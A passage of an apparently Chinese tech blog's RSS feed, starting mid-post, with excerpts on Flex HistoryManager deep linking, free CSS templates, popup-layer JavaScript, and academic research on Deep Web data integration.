Link也是通过和浏览器交互来实现的.如果浏览器不支持JavaScript或者禁用JavaScript，那么Deep LinK肯定是不能用的。 对于Deep Link应用，最重要的就是学会应用BrowserManager和HistoryManager这两个类。我们由简单到困难，先讲一讲HistoryManager这个类的应用。 第二，HistoryManager。 HistoryManager功能在Flex项目中是默认打开的，比如在使用Accordion 和 TabNavigator组件时，在不同区域切换时，Flex会自动记录下各个状态，我们可以通过点击浏览器的“前进”和“后退”按钮来前进和倒退，在你切换这些组件的区域时，Flex会自动你在网页链接的后面加写参数，以便记录当前页面的状态。 默认情况下HistoryManager的功能是打开的，你可以通过设置各个组件或Application的historyManagementEnabled属性为false（默认为TRUE）来关闭此功能。 这些都没什么好讲的。关键是怎么在一些普通组建上使用HistoryManager功能，默认的navigator container组建都是支持该功能的。要使一些普通组建也支持此功能，必须： 1.实现mx.managers.IHistoryManagerClient接口。 2.用HistoryManager’的&#xA;register()方法为组建注册。 3.当组件状态改变时保存组件的状态。 4.通过实施IHistoryManagerClient的saveState() 和 loadState()方法来保存和读取组件状态。 拿CheckBox为例： xmlns:mx=”http://www.adobe.com/2006/mxml”&#xA;label=”Check me”&#xA;implements=”mx.managers.IHistoryManagerClient” //关键步骤1，实现接口&#xA;creationComplete=”mx.managers.HistoryManager.register(this);”//关键步骤2，注册组件&#xA;change=”boxChanged(event)”//关键步骤3，当组件发生变化时保存状态 &amp;gt; public function saveState():Object {&#xA;return {selected:selected};&#xA;}&#xA;//实施IHistoryManagerClient的loadState()方法读取状态&#xA;public function loadState(state:Object):void {&#xA;var newState:Boolean = state; if (newState != selected) {</description>
    </item>
    <item>
      <title>基于firefox浏览器的Deep Web Navigation总结</title>
      <link>https://anwangtanmi.github.io/posts/5415b314aeb2a826618aee7f5be7041b/</link>
      <pubDate>Mon, 29 Dec 2008 12:24:34 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/5415b314aeb2a826618aee7f5be7041b/</guid>
      <description> 先占个位置，这两天准备回家，办手续，定房子什么的，比较忙，先提供个论文作为参考Deep Web Navigation in Web Data Extraction。准备分两次总结一下基于firefox和HtmlUnit的。 突然发现挖了很多坑，没种树了,说不定明年植树节才能把树种上。 </description>
    </item>
    <item>
      <title>16个漂亮的免费CSS模板</title>
      <link>https://anwangtanmi.github.io/posts/237edee27cdfbc59ebf6f3ca46838070/</link>
      <pubDate>Fri, 14 Nov 2008 09:22:38 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/237edee27cdfbc59ebf6f3ca46838070/</guid>
      <description>下面是16款漂亮的免费CSS模板，你不但可以欣赏它，还可以免费下载它进行学习，你也能创造出更加惊人的Web设计。&#xA;Black Berry&#xA;模板演示&#xA;Business Company Blue&#xA;模板演示&#xA;Beez Design 模板演示&#xA;Photo Gallery Template 模板演示&#xA;Breaking Ontop&#xA;模板演示&#xA;New Rise&#xA;模板演示&#xA;Dark Dimension&#xA;模板演示&#xA;Blog Division&#xA;模板演示&#xA;WidgetLike 模板演示&#xA;Concrete&#xA;模板演示&#xA;Real Estate&#xA;模板演示&#xA;AppleWeb&#xA;模板演示&#xA;Inter Craft&#xA;模板演示&#xA;Trial Services&#xA;模板演示&#xA;Ntech Blog&#xA;模板演示&#xA;Temper&#xA;模板演示</description>
    </item>
    <item>
      <title>searching the Deep web</title>
      <link>https://anwangtanmi.github.io/posts/06d771a2b964ecde5c646303759468a3/</link>
      <pubDate>Tue, 07 Oct 2008 09:54:00 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/06d771a2b964ecde5c646303759468a3/</guid>
      <description>searching the Deep web&#xA;While the Semantic Web may be a long time coming,&#xA;Deep Web search strategies offer the promise of a semantic Web.&#xA;THE WEB IS bigger than it looks. Beyond the billions of pages that populate the major search engines lies an even vaster, hidden Web of data: classified ads, library catalogs, air-line reservation systems, phone books, scientific databases, and all kinds of other information that remains largely concealed from view behind a curtain of query forms.</description>
    </item>
    <item>
      <title>弹出层效果，背景变暗</title>
      <link>https://anwangtanmi.github.io/posts/7ab6eb4d2bbe8c54459a86b75f4c2da2/</link>
      <pubDate>Fri, 23 May 2008 11:48:00 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/7ab6eb4d2bbe8c54459a86b75f4c2da2/</guid>
      <description>我把js做成一个文件保存为msg.js文件：&#xA;代码如下：&#xA;//&#xA;JavaScript Document&#xA;var&#xA;isIe&#xA;=&#xA;(document.all)&#xA;?&#xA;true&#xA;:&#xA;false&#xA;; //&#xA;设置select的可见状态 function&#xA;setSelectState(state) …&#xA;{ var objl=document.getElementsByTagName(‘select‘); for(var i=0;i&amp;lt;objl.length;i++) …{ objl[i].style.visibility=state; } }&#xA;function&#xA;mousePosition(ev) …&#xA;{ if(ev.pageX || ev.pageY) …{ return …{x:ev.pageX, y:ev.pageY}; } return …{ x:ev.clientX + document.body.scrollLeft – document.body.clientLeft,y:ev.clientY + document.body.scrollTop – document.body.clientTop }; }&#xA;//&#xA;弹出方法 function&#xA;showMessageBox(wTitle,content,pos,wWidth) …&#xA;{ closeWindow(); var bWidth=parseInt(document.documentElement.scrollWidth); var bHeight=parseInt(document.documentElement.scrollHeight); if(isIe)…{ setSelectState(‘hidden‘);} var back=document.createElement(“div“); back.id=“back“; var styleStr=“top:0px;left:0px;position:absolute;background:#003973;width:“+bWidth+“px;height:“+bHeight+“px;“; styleStr+=(isIe)?</description>
    </item>
    <item>
      <title>Deep Web问题及技术</title>
      <link>https://anwangtanmi.github.io/posts/3d0e8abb546a0aa50a5cc664f8135f46/</link>
      <pubDate>Tue, 25 Mar 2008 18:43:21 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/3d0e8abb546a0aa50a5cc664f8135f46/</guid>
      <description> [size=xx-large]Deep Web数据集成专刊前言[/size]&#xA;孟小峰1, 于 戈2&#xA;1(中国人民大学 信息学院,北京 100872)&#xA;2(东北大学 信息科学与工程学院,辽宁 沈阳 110004)&#xA;作者简介:&#xA;孟小峰(1964－),男,博士,中国人民大学信息学院教授,博士生导师.现为中国计算机学会理事,普及工委主任,中国计算机学会数据库专委会委员、秘书长,办公自动化专委会副主任委员,《计算机研究与发展》等期刊编委,MDM、WAIM等国际学术会议指导委员会委员,IEEE CS、ACM SIGMOD会员.曾先后在香港中文大学、香港城市大学、新加坡国立大学、法国Prism实验室访问研究.主持或参加过20多项国家科技攻关项目、国家自然科学基金、国家高技术研究发展计划(863)、信息产业部发展基金项目以及国际合作交流项目等.先后获得国家科技进步二等奖1项、电子部科技进步特等奖 1项、北京市科技进步二等奖2项,以及第7届”中创软件人才奖”、”新世纪优秀人才”、”第三届北京市高等学校名师奖”等奖项.研制开发的主要软件产品有国产数据库系统COBASE、嵌入式移动数据库系统”小金灵”、中文自然语言查询系统NChiql、并行数据库系统PBASE/1等.近5年先后在国内外学术期刊以及VLDB、SIGMOD、ICDE等重要国际会议发表论文100余篇.多次应邀担任国际会议程序主席或委员,如SIGMOD、ICDE、 ER、DASFAA、MDM等.近期主要研究领域为Web数据集成、XML数据库、移动数据管理.&#xA;于戈(1962－),男,博士,东北大学教授,博士生导师,中国计算机学会理事,数据库专业委员会副主任委员,电子政务与办公自动化专业委员会副主任委员,YOCSEF学术委员会荣誉委员,美国ACM学会和IEEE学会会员.1982年和1986年在东北大学分别获得计算机应用专业学士学位和硕士学位,1996年于日本九州大学获得计算机工学博士学位.1986年起在东北大学计算机科学与工程系任教.曾在日本九州大学、香港中文大学和香港科技大学做访问学者.研究方向涉及数据库系统、嵌入式软件、信息安全等相关领域.近年来,在国内外重要学术期刊和会议上发表论文100余篇,获得省部级自然科学奖3项、科技进步奖2项.&#xA;联系人: 孟小峰 E-mail: [email protected]&#xA;Received 2007-12-28 随着World Wide Web的飞速发展,出现了越来越多的可以在线访问的数据库,我们把这些数据库称作Web数据库.据统计,目前Web数据库的数量已经超过了45万个,在此基础上构成了Deep Web.Deep Web蕴含了大量有用的信息,其价值远远超过了仅由网页构成的Surface Web.但由于对Web数据库的访问只能通过其提供的查询接口,因此很难被一般的搜索引擎获取到.由于Deep Web的大规模性、动态性以及异质性等特点,通过手工方式远远不能在效果和效率上满足用户对信息获取的需要.为了帮助人们快速、准确地利用Deep Web中的海量信息,研究者们已经在Deep Web数据集成方面展开了研究.这逐渐成为数据库领域的一个研究热点.研究者力图提出一种通用的集成方法,可以实现对现实世界各个领域的Deep Web数据的集成,并在查询接口集成和数据抽取等方面取得实质性的进展.近几年来,已有大量的研究成果在SIGMOD、VLDB等高级别的国际会议和期刊上发表.国内对Deep Web数据集成的研究也取得了一定的成果,但与国际水平相比还有一定的距离,主要表现在研究问题和解决方法上尚缺乏突破性的成果.&#xA;为了推动Deep Web数据集成在国内的进展,本专刊关注于当前国内在该研究领域最新的基础性、前瞻性、战略性的重大理论问题和关键技术的问题,目的在于为大家展示当前该领域的研究状况和最新的研究成果,为该领域的研究者们提供一个相互学习交流、借鉴指导的机会.&#xA;本专刊得到了国内同行的广泛响应与支持,收到稿件60余篇.本专刊严格按照《软件学报》审稿流程和评审要求对稿件进行了认真评审.审稿工作由本领域从事 Deep Web数据集成的海内外专家组成的评审委员会来组织,每篇稿件均经过两位以上评审委员的认真评审.最后,经过《软件学报》编委会终审,遴选出具有代表性的研究工作9篇.这些论文涉及了Deep Web数据集成的若干关键问题,研究的内容注重理论创新与实际应用相结合,立足于国际上最新的研究和应用状况,真实反映了当前我国的Deep Web数据集成技术在重要科学领域的应用研究状况.这里,我们要再次感谢大家的关注和向本专刊投稿的各位作者.&#xA;论文”一种基于图模型的Web数据库采样方法”把Web数据库模型化为一种图结构,在这个图结构上实现对Web数据库的采样,可以增量的方式获取近似随机的样本.该方法的一个重要特点是不受查询接口中属性表现形式的局限,因此是一种通用的Web数据库采样方法.&#xA;论文”一种基于语义及统计分析的Deep Web实体识别机制” 提出了一种基于语义及统计分析的实体识别机制(SS-EIM).SS-EIM主要由文本匹配模型、语义分析模型和分组统计模型组成,采用文本粗略匹配、表象关联关系获取以及分组统计分析的三段式逐步求精策略,基于文本特征、语义信息及约束规则来不断精化识别结果.该方法可有效解决Deep Web数据集成中数据纠错、消重及整合等问题.&#xA;论文”针对模板生成网页的一种数据自动抽取方法”提出了一种新颖的模板检测方法,并利用检测出的模板自动地从实例网页中抽取数据.与其他已有方法相比,该方法能够适用于”列表页面”和”详细页面”两种类型的网页.&#xA;论文”基于属性相关度的Web数据库大小估算方法”提出了一种基于词频统计的解决方法,通过分析Web数据库查询接口中属性间的相关度来获取某个属性上一组随机样本,并以对该属性分别提交由前k位高频词形成的试探查询的方式,估算出Web数据库中记录的总数.&#xA;论文”基于本体的Deep Web数据标注”借鉴语义Web领域中深度标注的思想,将领域本体作为Web数据库遵循的全局模式,引入到查询结果语义标注过程中,并将本体与接口模式、结果模式相结合,辅以查询条件重置的策略,对查询结果进行统计及结构特征分析,确定查询结果数据的语义标记.&#xA;论文”使用分类器自动发现特定领域的深度网入口”提出了一种三分类器的框架,用于自动识别特定领域的深度网入口.查询接口得到以后,可以将它们进行集成,然后将一个统一的接口提交给用户以便于查询信息.&#xA;论文”基于知识的Deep Web集成环境变化处理的研究” 研究了Deep Web集成环境中构件的依赖关系(执行偏序依赖和知识依赖),并在此基础上提出了一种基于知识的环境变化的处理方法,包括Deep Web集成环境变化处理模型、适应Deep Web环境变化的动态体系结构和处理算法,可以对大规模Deep Web集成的进一步探索和走向应用提供参考.&#xA;论文”基于网页上下文的Deep Web数据库分类” 给出了采用分层模糊集合对给定学习实例所发现的领域和语言知识进行表示和基于这些知识对标记词归一化的算法.基于上述预处理,给出了计算Deep Web数据库的K-NN分类算法,其中对数据库之间的语义距离计算综合了数据库表之间和含有数据库表的网页的内容文本之间的语义距离.&#xA;论文”基于页面Block的Web档案采集和存储”提出了基于页面Block的采集和存储方式,并详细表述了该方法如何完成基于布局页面分区、Block主题的抽取、版本和差异的比较以及增量存储的方式.本文还实现了一个Web归档原型系统,并对所提出的算法进行了详细的测试.&#xA;这些论文集中反映了国内研究者在Deep Web数据的分析、集成和检索等方面的最新研究成果,对于促进针对下一代信息系统的创新性研究,以及鼓励数据库技术与其他相关领域的交叉研究具有重要的意义. </description>
    </item>
  </channel>
</rss>
